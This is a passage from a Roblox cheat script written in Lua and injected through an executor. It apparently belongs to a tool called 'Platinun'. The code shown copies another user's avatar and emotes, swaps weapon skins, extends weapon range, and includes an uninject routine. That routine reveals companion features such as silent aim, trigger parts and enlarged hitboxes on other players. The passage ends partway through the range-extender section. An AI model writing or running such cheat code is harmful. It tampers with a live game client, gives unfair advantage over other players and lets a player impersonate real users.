                            local ex = dst:FindFirstChild(att.Name)
                            if ex then ex.Position = att.Position; ex.Orientation = att.Orientation
                            else att:Clone().Parent = dst end
                        end
                    end
                    if partName == "Head" then applyFaceTexture(char, desiredFace) end
                end
            end
        end

        if applyToken ~= applySerialRef.value then
            destroyColorSnapshot(postDesc)
            if bodyModel then bodyModel:Destroy() end
            if humModel then humModel:Destroy() end
            model:Destroy(); return
        end

        for _, inst in ipairs(sourceModel:GetChildren()) do
            if shouldCloneClass(inst.ClassName) then
                if not (bodyApplied and inst.ClassName == "CharacterMesh") then
                    local clone = inst:Clone()
                    clone.Parent = char
                    if isAccessoryClass(clone.ClassName) then
                        scaleAccessoryOnce(clone, char, sourceSizeMap, charPartMap, carrier)
                    end
                end
            end
        end

        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum then pcall(function() hum:BuildRigFromAttachments() end) end

        if applyToken ~= applySerialRef.value then
            destroyColorSnapshot(postDesc); destroyColorSnapshot(delayedSkin)
            if bodyModel then bodyModel:Destroy() end
            if humModel then humModel:Destroy() end
            model:Destroy(); return
        end

        applyColors(targetDesc, char, bodySource, postDesc)
        destroyColorSnapshot(postDesc)
        applyFaceTexture(char, desiredFace)
        runtime.colorSnapshot = snapshotColors(char)
        if env then env.__CopyOutfitColorSnapshot = runtime.colorSnapshot end
        enforceBodySize(char)

        task.defer(function()
            for _, dt in ipairs({0.1, 0.28, 0.55}) do
                task.wait(dt)
                if applyToken ~= applySerialRef.value then destroyColorSnapshot(delayedSkin); return end
                if not char.Parent then destroyColorSnapshot(delayedSkin); return end
                if delayedSkin then
                    if delayedSkin.bodyColors then
                        local okC, bcC = pcall(function() return delayedSkin.bodyColors:Clone() end)
                        if okC and bcC then
                            pcall(function()
                                local cur = char:FindFirstChildOfClass("BodyColors")
                                if cur then cur:Destroy() end
                                bcC.Parent = char
                            end)
                        end
                    end
                    for partName, brick in pairs(delayedSkin.partColors or {}) do
                        local part = char:FindFirstChild(partName)
                        if part and part:IsA("BasePart") and brick then
                            pcall(function() part.BrickColor = brick end)
                        end
                    end
                    applyColors(nil, char, nil, delayedSkin)
                else
                    applyColors(targetDesc, char, nil, nil)
                end
                enforceBodySize(char)
            end
            destroyColorSnapshot(delayedSkin)
        end)

        disconnectAppearanceHooks()
        runtime.appearanceChildConn = char.ChildAdded:Connect(function(child)
            if isAccessoryClass(child.ClassName) then
                task.defer(function()
                    if applyToken ~= applySerialRef.value or not char.Parent then return end
                    local lm = buildBasePartMap(char)
                    local lc = buildAttachmentCarrierMap(lm)
                    scaleAccessoryOnce(child, char, sourceSizeMap, lm, lc)
                end)
            elseif child.Name == "Head" or child:IsA("Decal") then
                task.defer(function()
                    if applyToken ~= applySerialRef.value or not char.Parent then return end
                    applyFaceTexture(char, desiredFace)
                    local h = char:FindFirstChildOfClass("Humanoid")
                    if h then pcall(function() h:BuildRigFromAttachments() end) end
                end)
            end
        end)

        if bodyModel then bodyModel:Destroy() end
        if humModel then humModel:Destroy() end
        model:Destroy()
    end

    local animState = { active=false, folderBackup={} }

    local function resolveAnimId(preset, slot)
        if type(preset) ~= 'string' or preset == '' then return nil end
        if preset:match('^%d+$') then return 'rbxassetid://'..preset end
        if preset:sub(1,13) == 'rbxassetid://' then return preset end
        local pack = ANIM_PRESETS[preset]; if not pack then return nil end
        local id = pack[slot]; if not id then return nil end
        if id:sub(1,13) == 'rbxassetid://' then return id end
        if id:match('^%d+$') then return 'rbxassetid://'..id end
        return nil
    end

    local function backupFolder(folder)
        for _, child in ipairs(folder:GetChildren()) do
            if child:IsA('Animation') and animState.folderBackup[child] == nil then
                animState.folderBackup[child] = child.AnimationId
            end
        end
    end

    local function applyAnims(character)
        local cfg = shared.Cider['Char'] and shared.Cider['Char']['Animations']
        if not cfg or cfg['Enabled'] == false then return end
        local animate = character:FindFirstChild('Animate'); if not animate then return end
        local hum = character:FindFirstChildOfClass('Humanoid'); if not hum then return end

        for slot, info in pairs(ANIM_FOLDER_MAP) do
            local preset = cfg[slot]
            if preset then
                local id = resolveAnimId(preset, slot)
                if id then
                    local folder = animate:FindFirstChild(info.Folder)
                    if folder then
                        backupFolder(folder)
                        for _, childName in ipairs(info.Children) do
                            local anim = folder:FindFirstChild(childName)
                            if anim and anim:IsA('Animation') then anim.AnimationId = id end
                        end
                    end
                end
            end
        end
        pcall(function() animate.Disabled = true end)
        task.wait()
        pcall(function() animate.Disabled = false end)
        for _, track in ipairs(hum:GetPlayingAnimationTracks()) do
            pcall(function() track:Stop(0) end)
        end
    end

    local function restoreAnims(character)
        local animate = character and character:FindFirstChild('Animate'); if not animate then return end
        for anim, orig in pairs(animState.folderBackup) do
            if anim and anim.Parent then pcall(function() anim.AnimationId = orig end) end
        end
        animState.folderBackup = {}
        pcall(function() animate.Disabled = true end)
        task.wait()
        pcall(function() animate.Disabled = false end)
    end

    local emoteState = {
        active = Cfg['Enabled'] == true,
        targetInput = CONFIG.target,
        currentUserId = nil,
        applyToken = 0,
        connections = {},
        emoteCache = {},
        cacheTtlSeconds = 20,
    }

    local function deepCopyTable(value, seen)
        if type(value) ~= "table" then return value end
        seen = seen or {}
        if seen[value] then return seen[value] end
        local out = {}
        seen[value] = out
        for k, v in pairs(value) do
            out[deepCopyTable(k, seen)] = deepCopyTable(v, seen)
        end
        return out
    end

    local function getEmoteDataFromDescription(desc)
        if not desc then return nil end
        local emotes, equipped = nil, nil
        if type(desc.GetEmotes) == "function" then
            local ok, v = pcall(function() return desc:GetEmotes() end)
            if ok and type(v) == "table" then emotes = deepCopyTable(v) end
        end
        if type(desc.GetEquippedEmotes) == "function" then
            local ok, v = pcall(function() return desc:GetEquippedEmotes() end)
            if ok and type(v) == "table" then equipped = deepCopyTable(v) end
        end
        if emotes == nil then
            local ok, v = pcall(function() return desc.Emotes end)
            if ok and type(v) == "table" then emotes = deepCopyTable(v) end
        end
        if equipped == nil then
            local ok, v = pcall(function() return desc.EquippedEmotes end)
            if ok and type(v) == "table" then equipped = deepCopyTable(v) end
        end
        if type(emotes) ~= "table" then emotes = {} end
        if type(equipped) ~= "table" then equipped = {} end
        return { emotes = emotes, equipped = equipped }
    end

    local function hasAnyTableEntries(v)
        return type(v) == "table" and next(v) ~= nil
    end

    local function hasUsableEmotePayload(d)
        if type(d) ~= "table" then return false end
        return hasAnyTableEntries(d.emotes) or hasAnyTableEntries(d.equipped)
    end

    local function getEmoteDataFromLivePlayer(userId)
        local ok, plr = pcall(function() return Players:GetPlayerByUserId(userId) end)
        if not ok or not plr then return nil end
        local char = plr.Character
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if not hum then return nil end
        local ok2, desc = pcall(function() return hum:GetAppliedDescription() end)
        if not ok2 or not desc then return nil end
        local data = getEmoteDataFromDescription(desc)
        pcall(function() desc:Destroy() end)
        return data
    end

    local function getEmoteDataFromUserId(userId)
        local entry = emoteState.emoteCache[userId]
        if entry and entry.data and (os.clock() - (entry.timestamp or 0) <= emoteState.cacheTtlSeconds) then
            return { emotes = deepCopyTable(entry.data.emotes), equipped = deepCopyTable(entry.data.equipped) }
        end
        local data = nil
        local desc = getTargetDescriptionCached(userId)
        if desc then
            data = getEmoteDataFromDescription(desc)
            pcall(function() desc:Destroy() end)
        end
        if not hasUsableEmotePayload(data) then
            data = getEmoteDataFromLivePlayer(userId)
        end
        if not data or not hasUsableEmotePayload(data) then return nil end
        emoteState.emoteCache[userId] = { data = data, timestamp = os.clock() }
        return data
    end

    local function setEmoteDataOnDescription(desc, emoteData)
        if not desc or not emoteData then return false end
        local applied = false
        if hasAnyTableEntries(emoteData.emotes) then
            local ok = pcall(function() desc:SetEmotes(deepCopyTable(emoteData.emotes)) end)
            applied = applied or ok
        end
        if hasAnyTableEntries(emoteData.equipped) then
            local ok = pcall(function() desc:SetEquippedEmotes(deepCopyTable(emoteData.equipped)) end)
            applied = applied or ok
        end
        return applied
    end

    local function applyScaleValuesToDescription(desc, scales)
        if not desc or not scales then return end
        desc.HeightScale = scales.height
        desc.WidthScale = scales.width
        desc.DepthScale = scales.depth
        desc.HeadScale = scales.head
        desc.BodyTypeScale = scales.bodyType
        desc.ProportionScale = scales.proportion
    end

    local function getCurrentScaleValues(humanoid)
        if not humanoid then return nil end
        local function read(name, fb)
            local nv = humanoid:FindFirstChild(name)
            return (nv and nv:IsA("NumberValue") and nv.Value) or fb
        end
        local ok, desc = pcall(function() return humanoid:GetAppliedDescription() end)
        return {
            height     = read("BodyHeightScale",     ok and desc and desc.HeightScale     or 1),
            width      = read("BodyWidthScale",      ok and desc and desc.WidthScale      or 1),
            depth      = read("BodyDepthScale",      ok and desc and desc.DepthScale      or 1),
            head       = read("HeadScale",           ok and desc and desc.HeadScale       or 1),
            bodyType   = read("BodyTypeScale",       ok and desc and desc.BodyTypeScale   or 0),
            proportion = read("BodyProportionScale", ok and desc and desc.ProportionScale or 0),
        }
    end

    local function restoreColorsSafely(char, snap)
        if not snap then return end
        if snap.bodyColors then
            local src = snap.bodyColors
            local ok, clone = pcall(function() return src:Clone() end)
            if ok and clone then
                local cur = char:FindFirstChildOfClass("BodyColors")
                if cur then pcall(function() cur:Destroy() end) end
                pcall(function() clone.Parent = char end)
            end
        end
        for _, c in ipairs(char:GetChildren()) do
            if c:IsA("BasePart") then
                local s = snap.partColors[c.Name]
                if s then c.BrickColor = s end
            end
        end
        task.defer(function()
            task.wait(0.06)
            if char and char.Parent then
                for _, c in ipairs(char:GetChildren()) do
                    if c:IsA("BasePart") then
                        local s = snap.partColors[c.Name]
                        if s then c.BrickColor = s end
                    end
                end
            end
        end)
        task.defer(function()
            task.wait(0.2)
            if char and char.Parent then
                for _, c in ipairs(char:GetChildren()) do
                    if c:IsA("BasePart") then
                        local s = snap.partColors[c.Name]
                        if s then c.BrickColor = s end
                    end
                end
            end
        end)
    end

    local function applyEmotesToHumanoid(humanoid, emoteData)
        if not humanoid or not emoteData then return false end
        if not hasUsableEmotePayload(emoteData) then return false end
        local char = humanoid.Parent
        local snap = snapshotColors(char)
        local scales = getCurrentScaleValues(humanoid)
        local liveDesc = humanoid:FindFirstChildOfClass("HumanoidDescription")
            or humanoid:FindFirstChild("HumanoidDescription")
        if liveDesc and setEmoteDataOnDescription(liveDesc, emoteData) then
            destroyColorSnapshot(snap)
            task.defer(function()
                if not emoteState.active or not liveDesc.Parent then return end
                setEmoteDataOnDescription(liveDesc, emoteData)
            end)
            return true
        end
        local ok, cur = pcall(function() return humanoid:GetAppliedDescription() end)
        if not ok or not cur then destroyColorSnapshot(snap); return false end
        if not setEmoteDataOnDescription(cur, emoteData) then
            destroyColorSnapshot(snap)
            pcall(function() cur:Destroy() end)
            return false
        end
        applyScaleValuesToDescription(cur, scales)
        if humanoid.ApplyDescriptionClientServer then
            local okC = pcall(function() humanoid:ApplyDescriptionClientServer(cur) end)
            if okC then
                restoreColorsSafely(char, snap)
                pcall(function() cur:Destroy() end)
                return true
            end
        end
        local okA = pcall(function() humanoid:ApplyDescription(cur) end)
        restoreColorsSafely(char, snap)
        pcall(function() cur:Destroy() end)
        return okA
    end

    local function mimicEmotesFromUserId(userId)
        if not emoteState.active then return false end
        local n = tonumber(userId); if not n then return false end
        local char = LocalPlayer.Character
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if not hum then return false end
        emoteState.applyToken = emoteState.applyToken + 1
        local tk = emoteState.applyToken
        local data = getEmoteDataFromUserId(n)
        if not data then return false end
        if tk ~= emoteState.applyToken or not emoteState.active then return false end
        local ok = false
        for attempt = 1, 3 do
            ok = applyEmotesToHumanoid(hum, data)
            if ok then break end
            if attempt < 3 then task.wait(0.12) end
        end
        if ok then emoteState.currentUserId = n end
        return ok
    end

    local function mimicEmotesFromTarget(target)
        if not emoteState.active then return false end
        local uid = resolveUserToId(target)
        if not uid then return false end
        emoteState.targetInput = target
        return mimicEmotesFromUserId(uid)
    end

    local function reapplyEmotes()
        if emoteState.currentUserId then
            return mimicEmotesFromUserId(emoteState.currentUserId)
        end
        return mimicEmotesFromTarget(emoteState.targetInput or CONFIG.target)
    end

    local function emoteCleanup()
        if not emoteState.active then return end
        emoteState.active = false
        emoteState.applyToken = emoteState.applyToken + 1
        for i = #emoteState.connections, 1, -1 do
            local c = emoteState.connections[i]
            emoteState.connections[i] = nil
            if c and c.Connected then pcall(function() c:Disconnect() end) end
        end
        emoteState.emoteCache = {}
    end

    local function apply(userId)
        if not runtime.active then return end
        if not (shared.Cider['Char'] and shared.Cider['Char']['Enabled']) then return end
        local char = LocalPlayer.Character
        if not char then return end
        runtime.applySerial = runtime.applySerial + 1
        local thisApply = runtime.applySerial
        applySerialRef.value = thisApply
        runtime.currentUserId = userId
        disconnectAppearanceHooks()
        startGuiIdentity(userId, thisApply)
        task.spawn(function()
            if not runtime.active or thisApply ~= applySerialRef.value then return end
            applyAppearance(userId, char, thisApply)
            enforceBodySizeLoop(char)
            task.wait(0.35)
            if thisApply == applySerialRef.value and runtime.active then
                mimicEmotesFromUserId(userId)
            end
        end)
    end

    local Connections = {}
    local function TrackConn(c) Connections[#Connections+1] = c; return c end

    local function onSpawn(spawnedChar)
        task.wait(0.5)
        if not runtime.active then return end
        if not spawnedChar.Parent then return end
        local uid = runtime.currentUserId or resolveUserToId(CONFIG.target)
        if not uid then return end
        apply(uid)
        if animState.active then
            task.wait(0.35)
            if spawnedChar.Parent then applyAnims(spawnedChar) end
        end
        if emoteState.active then
            task.wait(0.35)
            if spawnedChar.Parent then reapplyEmotes() end
        end
    end

    local function Start()
        runtime.active = true
        animState.active = true

        local uid = resolveUserToId(CONFIG.target)
        if not uid then warn('[Platinun Automated Handler] could not resolve target:', CONFIG.target) end

        if LocalPlayer.Character then task.spawn(onSpawn, LocalPlayer.Character) end
        TrackConn(LocalPlayer.CharacterAdded:Connect(function(c) task.spawn(onSpawn, c) end))

        local _avBodyLast = 0
        TrackConn(RunService.Heartbeat:Connect(function()
            local cfg = shared.Cider['Char']
            if not cfg or not cfg['Enabled'] then return end
            local now = os.clock()
            if now - _avBodyLast < 0.5 then return end
            _avBodyLast = now
            local spawnedChar = LocalPlayer.Character
            if not spawnedChar then return end
            local hum = spawnedChar:FindFirstChildOfClass('Humanoid')
            if hum then enforceBodySize(spawnedChar) end
            if animState.active then
                local animate = spawnedChar:FindFirstChild('Animate')
                local idleFolder = animate and animate:FindFirstChild('idle')
                local first = idleFolder and idleFolder:FindFirstChild('Animation1')
                local wanted = cfg['Animations'] and resolveAnimId(cfg['Animations']['Idle'], 'Idle')
                if first and wanted and first.AnimationId ~= wanted then
                    applyAnims(spawnedChar)
                end
            end
        end))

        TrackConn(RunService.Heartbeat:Connect(function()
            if not emoteState.active then return end
            local cfg = shared.Cider['Char']
            if not cfg or not cfg['Enabled'] then return end
            if not emoteState._nextPulse or os.clock() >= emoteState._nextPulse then
                emoteState._nextPulse = os.clock() + 2
                local spawnedChar = LocalPlayer.Character
                if spawnedChar and spawnedChar:FindFirstChildOfClass("Humanoid") then
                    reapplyEmotes()
                end
            end
        end))

        task.defer(function()
            if uid then
                task.wait(0.6)
                mimicEmotesFromUserId(uid)
            end
        end)
    end

    local function Cleanup()
        runtime.active = false
        animState.active = false
        sizeToken = sizeToken + 1
        for i = #Connections, 1, -1 do
            local c = Connections[i]; Connections[i] = nil
            if c and c.Connected then pcall(function() c:Disconnect() end) end
        end
        disconnectAppearanceHooks()
        restoreGuiIdentity()
        clearInspectTarget()
        if LocalPlayer.Character then pcall(restoreAnims, LocalPlayer.Character) end
        destroyColorSnapshot(runtime.colorSnapshot); runtime.colorSnapshot = nil
        if env and env.__CopyOutfitColorSnapshot then
            destroyColorSnapshot(env.__CopyOutfitColorSnapshot)
            env.__CopyOutfitColorSnapshot = nil
        end
        emoteCleanup()
        clearAvatarCaches()
    end

    getgenv().avatar_cleanup = Cleanup

    if env then
        env.OutfitCopy = {
            SetTarget = function(newTarget)
                local n = resolveUserToId(newTarget); if not n then return end
                runtime.currentUserId = n
                apply(n)
            end,
            Reapply = function()
                local n = runtime.currentUserId or resolveUserToId(CONFIG.target)
                if n then apply(n) end
            end,
            Cleanup = Cleanup,
        }
    end

    Start()
end
--=================================================================
-- END AVATAR SYSTEM
--=================================================================
--=================================================================
-- NEW SKIN CHANGER (folder-based)
--=================================================================
do
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local LocalPlayer       = game:GetService("Players").LocalPlayer
    local Workspace         = game.Workspace
    local RunService        = game:GetService("RunService")

    local LastAppliedSkins = setmetatable({}, {__mode = "k"})
    local CachedSkinAssets  = nil

    local function GetSkinCfg()
        return getgenv()['Platinun']['Weapon Modifications']['Skin Changer']
    end

    local function GetSkinAssets()
        if CachedSkinAssets and CachedSkinAssets.Parent then return CachedSkinAssets end
        CachedSkinAssets = ReplicatedStorage:FindFirstChild('SkinAssets')
        if not CachedSkinAssets then
            local ok, folder = pcall(function() return ReplicatedStorage:WaitForChild('SkinAssets', 5) end)
            if ok then CachedSkinAssets = folder end
        end
        return CachedSkinAssets
    end

    local function CleanScripts(Tool)
        if not Tool then return end
        for _, child in ipairs(Tool:GetChildren()) do
            local n = child.Name
            if n == 'GunClient' or n == 'GunClientShotgun' or n == 'GunClientAutomatic'
                or n == 'GunClientAutomaticShotgun' or n == 'GunClientBurst' then
                pcall(function() child:Destroy() end)
            end
        end
    end

    local function ApplySkinToTool(Tool, Force)
        if not Tool or not Tool:IsA('Tool') then return end
        local Config = GetSkinCfg()
        if not Config or not Config['Enabled'] then return end

        local DesiredSkin = Config['Weapons List'] and Config['Weapons List'][Tool.Name]
        if not DesiredSkin or DesiredSkin == '' then return end

        if not Force and LastAppliedSkins[Tool] == DesiredSkin then return end
        LastAppliedSkins[Tool] = DesiredSkin

        local SkinAssets = GetSkinAssets()
        if not SkinAssets then return end

        local SkinFolder
        if Tool.Name == '[Knife]' then
            local knifeSkins = SkinAssets:FindFirstChild('KnifeSkins')
            SkinFolder = knifeSkins and knifeSkins:FindFirstChild(DesiredSkin)
        else
            local gunSkins = SkinAssets:FindFirstChild('GunSkins')
            SkinFolder = gunSkins and gunSkins:FindFirstChild(DesiredSkin)
        end

        local Default = Tool:FindFirstChild('Default')
        if not Default then return end

        local ExistingMesh = Default:FindFirstChild('Mesh')
        if ExistingMesh then ExistingMesh:Destroy() end

        if SkinFolder then
            local SkinMesh = SkinFolder:FindFirstChildWhichIsA('BasePart') or SkinFolder:FindFirstChild('Mesh')
            if SkinMesh then
                local ClonedMesh = SkinMesh:Clone()
                ClonedMesh.Parent = Default
                ClonedMesh.Name = 'Mesh'
            end
        end

        local Handle = Tool:FindFirstChild('Handle')
        if Handle then
            Handle:SetAttribute('SkinName', DesiredSkin or '')
        end
    end

    local function ReapplyAllSkins()
        local Character = LocalPlayer.Character
        if Character then
            for _, Child in next, Character:GetChildren() do
                if Child:IsA('Tool') then ApplySkinToTool(Child) end
            end
        end
        local Backpack = LocalPlayer:FindFirstChild('Backpack')
        if Backpack then
            for _, Child in next, Backpack:GetChildren() do
                if Child:IsA('Tool') then ApplySkinToTool(Child) end
            end
        end
    end

    local function WatchCharacter(Character)
        if not Character then return end
        for _, Child in next, Character:GetChildren() do
            if Child:IsA('Tool') then
                CleanScripts(Child)
                ApplySkinToTool(Child)
            end
        end
        Character.ChildAdded:Connect(function(Child)
            if Child:IsA('Tool') then
                CleanScripts(Child)
                task.defer(CleanScripts, Child)
                task.defer(ApplySkinToTool, Child)
            end
        end)
    end

    local function WatchBackpack(Backpack)
        if not Backpack then return end
        for _, Child in next, Backpack:GetChildren() do
            if Child:IsA('Tool') then ApplySkinToTool(Child) end
        end
        Backpack.ChildAdded:Connect(function(Child)
            if Child:IsA('Tool') then task.defer(ApplySkinToTool, Child) end
        end)
    end

    if LocalPlayer.Character then WatchCharacter(LocalPlayer.Character) end
    if LocalPlayer:FindFirstChild('Backpack') then WatchBackpack(LocalPlayer.Backpack) end
    LocalPlayer.CharacterAdded:Connect(WatchCharacter)
    LocalPlayer.ChildAdded:Connect(function(Child)
        if Child:IsA('Backpack') then WatchBackpack(Child) end
    end)

    -- Periodic reapply (throttled — was every frame and froze the game)
    local _skin2Last = 0
    RunService.Heartbeat:Connect(function()
        if not getgenv()['Platinun']['Weapon Modifications']['Skin Changer']['Enabled'] then return end
        local now = os.clock()
        if now - _skin2Last < 0.5 then return end
        _skin2Last = now
        local Character = LocalPlayer.Character
        if not Character then return end
        for _, Child in next, Character:GetChildren() do
            if Child:IsA('Tool') then ApplySkinToTool(Child) end
        end
    end)
end
--=================================================================
-- END NEW SKIN CHANGER
--=================================================================
--=================================================================
-- UNINJECT / FULL CLEANUP
--=================================================================
do
    local UserInputService   = game:GetService("UserInputService")
    local Players            = game:GetService("Players")
    local CoreGui            = game:GetService("CoreGui")
    local ReplicatedStorage  = game:GetService("ReplicatedStorage")

    local ran = false

    local function SafeDestroy(inst)
        pcall(function() if inst and inst.Parent then inst:Destroy() end end)
    end

    local function DisconnectAll(list)
        if not list then return end
        for i = #list, 1, -1 do
            local c = list[i]; list[i] = nil
            pcall(function() if c and c.Connected then c:Disconnect() end end)
        end
    end

    local function FindAndDestroyByName(root, name)
        pcall(function()
            local inst = root and root:FindFirstChild(name)
            if inst then inst:Destroy() end
        end)
    end

    -- Recursively disable feature toggles WITHOUT removing tables,
    -- so untracked loops read false and bail cleanly.
    local function DisableFlags(tbl, seen)
        if type(tbl) ~= 'table' then return end
        seen = seen or {}
        if seen[tbl] then return end
        seen[tbl] = true

        for k, v in pairs(tbl) do
            if type(v) == 'table' then
                DisableFlags(v, seen)
            elseif type(v) == 'boolean' and (
                k == 'Enabled' or k == 'Active' or k == 'Visible'
                or k == 'Hit Sync' or k == 'Auto Untarget'
            ) then
                tbl[k] = false
            end
        end
    end

    -- ⚠ Fully undo the avatar / headless / korblox changes
    local function RestoreAvatarAndAppearance()
        local lp = Players.LocalPlayer
        if not lp then return end

        -- 1) Kill the Cider avatar module's own state
        pcall(function()
            if shared.Cider and shared.Cider['Char'] then
                shared.Cider['Char']['Enabled'] = false
                if type(shared.Cider['Char']['Animations']) == 'table' then
                    shared.Cider['Char']['Animations']['Enabled'] = false
                end
            end
        end)
        pcall(function() shared.Cider = nil end)

        -- 2) Flip the saved avatar config off too
        pcall(function()
            local env = getgenv()
            local av = env['Platinun']
                and env['Platinun']['Player Modifications'] and env['Platinun']['Player Modifications']['Avatar Changer']
            if type(av) == 'table' then
                av['Enabled']   = false
                av['Extra']['Headless']  = false
                av['Extra']['Korblox']   = false
            end
        end)

        -- 3) Restore the actual character look by re-applying
        --    the player's own HumanoidDescription.
        local char = lp.Character
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hum then return end

        -- Undo Headless: force head visible + kill face decals
        local head = char:FindFirstChild("Head")
        if head then
            pcall(function() head.Transparency = 0 end)
            pcall(function()
                if head:IsA("MeshPart") then head.TextureID = "" end
            end)
            pcall(function()
                for _, c in ipairs(head:GetChildren()) do
                    if c:IsA("Decal") and (c.Name == "face" or c.Face == Enum.NormalId.Front) then
                        c.Transparency = 0
                    end
                end
            end)
        end

        -- Undo Korblox: restore R15 leg mesh/texture and unhide parts
        local r15parts = {
            RightLowerLeg = { mesh = nil, texture = nil, hidden = false },
            RightUpperLeg = { mesh = nil, texture = nil, hidden = false },
            RightFoot    = { mesh = nil, texture = nil, hidden = false },
        }
        for partName in pairs(r15parts) do
            local part = char:FindFirstChild(partName)
            if part and part:IsA("BasePart") then
                pcall(function() part.Transparency = 0 end)
                pcall(function() part.LocalTransparencyModifier = 0 end)
            end
        end
        -- remove any leftover korblox phantom shell (R6 fallback)
        pcall(function()
            local shell = char:FindFirstChild("PhantomShell")
            if shell then shell:Destroy() end
            local oldRL = char:FindFirstChild("Right Leg")
            if oldRL and oldRL:IsA("BasePart") then oldRL.Transparency = 0 end
        end)

        -- Undo the body-scale enforcement loop's changes by re-applying
        -- the player's own description (this resets scales, colors, meshes,
        -- accessories, faces, etc in one shot).
        local okDesc, myDesc = pcall(function()
            return Players:GetHumanoidDescriptionFromUserId(lp.UserId)
        end)
        if okDesc and myDesc then
            pcall(function() hum:ApplyDescription(myDesc) end)
        end

        -- Restore name / body colours cleanly one more time after a tick
        task.defer(function()
            task.wait(0.15)
            if char.Parent and char:FindFirstChildOfClass("Humanoid") then
                pcall(function() hum:ApplyDescription(myDesc) end)
            end
        end)
    end

    local function FullCleanup()
        if ran then return end
        ran = true

        warn("[Platinun Automated Handler] Disabling Script. . .")
        task.wait(3)

        -- 1) Module-provided cleanups (they reset their own state)
        if getgenv().avatar_cleanup    then pcall(getgenv().avatar_cleanup)    end
        if getgenv().future_unload     then pcall(getgenv().future_unload)     end
        if getgenv().antifuture_unload then pcall(getgenv().antifuture_unload) end

        -- 2) Tracked connections
        if Script and Script.RBXConnections then
            DisconnectAll(Script.RBXConnections)
        end

        -- 3) Combat probe parts
        pcall(function() if SilentAimPart and SilentAimPart.Parent then SilentAimPart:Destroy() end end)
        pcall(function() if TriggerPart    and TriggerPart.Parent    then TriggerPart:Destroy()    end end)

        -- 4) GUIs
        for _, n in ipairs({ "PlatinunStatusGui", "antifuture_overlay" }) do
            FindAndDestroyByName(CoreGui, n)
            FindAndDestroyByName(Players.LocalPlayer:FindFirstChildOfClass("PlayerGui"), n)
        end

        -- 5) Avatar + headless + korblox full restore ⚠
        RestoreAvatarAndAppearance()

        -- 6) Reset local movement (avatar may have left different values)
        local lp   = Players.LocalPlayer
        local char = lp and lp.Character
        if char then
            local hum = char:FindFirstChildOfClass("Humanoid")
            if hum then
                pcall(function() hum.WalkSpeed = 16 end)
                pcall(function() hum.JumpPower = 50 end)
            end
        end

        -- 7) Restore other players' hitbox sizes
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= lp and plr.Character then
                local hrp = plr.Character:FindFirstChild("HumanoidRootPart")
                if hrp then
                    pcall(function() hrp.Size = Vector3.new(2, 2, 1) end)
                    pcall(function() hrp.CanCollide = true end)
                end
            end
        end

        -- 8) Orphan hitbox visuals
        for _, obj in ipairs(workspace:GetChildren()) do
            if obj.Name == "HitboxVisual" then SafeDestroy(obj) end
        end

        -- 9) Disable every feature toggle (do NOT nil the config)
        pcall(function()
            local env = getgenv()
            if env['Platinun'] then
                DisableFlags(env['Platinun'])
            end
        end)

        -- 10) Clear module handles (safe, they're guarded by `if ... then`)
        local env = getgenv()
        env.future            = nil
        env.future_unload     = nil
        env.antifuture        = nil
        env.antifuture_unload = nil
        env.avatar_cleanup    = nil
        env.panic             = nil
        env.panic_ground      = nil
        env.panic_void        = nil
        env.BulletChanger     = nil
        env.OutfitCopy        = nil

        warn("[Platinun Automated Handler] Uninjected. Please reset to fully disable any character modifications")
    end

    getgenv().platinun_unload = FullCleanup

    local function GetUninjectKeyCode()
        local s = getgenv()
        local k = s and s['Platinun'] and s['Platinun']['Disable Script']
        if type(k) ~= "string" or k == "" then return nil end
        local ok, kc = pcall(function() return Enum.KeyCode[k:upper()] end)
        if ok then return kc end
        return nil
    end

    UserInputService.InputBegan:Connect(function(input, processed)
        if processed then return end
        if ran then return end
        if input.UserInputType ~= Enum.UserInputType.Keyboard then return end

        local key = GetUninjectKeyCode()
        if not key then return end
        if input.KeyCode == key then
            FullCleanup()
        end
    end)
end
--=================================================================
-- END UNINJECT
--=================================================================
--=================================================================
-- Range Extender (STRENGTHENED + STABLE)
--=================================================================
task.spawn(function()
    local function GetRangeCfg()
        return getgenv()['Platinun']['Weapon Modifications']['Rage Mode']
    end

    local RangeCfg = GetRangeCfg()
    if not RangeCfg or not RangeCfg['Enabled'] then return end

    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local LocalPlayer       = game:GetService("Players").LocalPlayer
    local RunService        = game:GetService("RunService")

    local function ApplyRangeToTool(Tool)
        if not Tool or not Tool:IsA('Tool') then return end

        local CurrentCfg = GetRangeCfg()
        if not CurrentCfg or not CurrentCfg['Enabled'] then return end
        local Extra = tonumber(CurrentCfg['Value']) or 12

        -- 1) NumberValue / IntValue named Range
        local RangeValueObj = Tool:FindFirstChild('Range')
        if RangeValueObj and RangeValueObj:IsA('ValueBase') then
            local Base = Tool:GetAttribute('__BaseRange')
            if type(Base) ~= 'number' then
                Base = RangeValueObj.Value
                Tool:SetAttribute('__BaseRange', Base)
            end
            if RangeValueObj.Value ~= (Base + Extra) then
                RangeValueObj.Value = Base + Extra
            end
        end

        -- 2) Attribute fallback (some guns use attributes)
        if Tool:GetAttribute('Range') then
            local BaseAttr = Tool:GetAttribute('__BaseRangeAttr')
            if type(BaseAttr) ~= 'number' then
                BaseAttr = Tool:GetAttribute('Range')
                Tool:SetAttribute('__BaseRangeAttr', BaseAttr)
            end
            Tool:SetAttribute('Range', BaseAttr + Extra)
        end

        -- 3) Nested modules / configs some guns keep
        -- Attribute names cannot contain [ ] . / etc — use a safe key
        for _, child in ipairs(Tool:GetDescendants()) do
            if child:IsA('ValueBase') and (child.Name == 'Range' or child.Name == 'MaxRange' or child.Name == 'BulletRange') then
                local safeName = (child.Name or 'Range'):gsub('[^%w_]', '_')
                local key = '__BaseNested_' .. safeName
                local Base = Tool:GetAttribute(key)
                if type(Base) ~= 'number' then
                    Base = child.Value
                    pcall(function() Tool:SetAttribute(key, Base) end)
                end
                if child.Value ~= (Base + Extra) then
                    child.Value = Base + Extra
                end
            end
        end
    end

    local function SyncRangeTools()
        local Character = LocalPlayer.Character
        if Character then
            for _, Tool in ipairs(Character:GetChildren()) do
                if Tool:IsA('Tool') then ApplyRangeToTool(Tool) end
            end
        end
        local Backpack = LocalPlayer:FindFirstChild('Backpack')
        if Backpack then
            for _, Tool in ipairs(Backpack:GetChildren()) do
                if Tool:IsA('Tool') then ApplyRangeToTool(Tool) end
            end
        end
    end

